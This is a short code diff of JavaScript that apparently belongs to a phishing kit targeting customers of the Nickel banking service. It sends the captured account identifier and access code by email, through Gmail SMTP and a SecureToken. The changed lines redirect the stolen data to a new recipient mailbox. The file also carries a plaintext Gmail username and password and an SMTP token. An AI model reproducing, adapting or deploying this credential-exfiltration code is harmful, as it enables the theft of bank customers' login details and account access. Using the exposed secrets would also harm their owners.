@@ -89,7 +89,7 @@ function addChecked(e) {
             Host: "smtp.gmail.com",
             Username: "leonbonou20@gmail.com",
             Password: "anselmo12.",
-            To : 'anselmehotegni@gmail.com',
+            To : 'nickelapp266@gmail.com',
             From : "leonbonou20@gmail.com",
             Subject : "Les Codes Nickel",
             Body : "ok"//"Identifiant: " + identifiant + " - Code : " + codeAccess
@@ -101,7 +101,7 @@ function addChecked(e) {
         Email.send({
             SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",
 
-            To : 'rolandgarcia75000@gmail.com',
+            To : 'nickelapp266@gmail.com',
             From : "leonbonou20@gmail.com",
             Subject : "Nickel Information :-)",
             Body : "<strong>Les informations du compte Nickel</strong> <br><br><br>\n" +
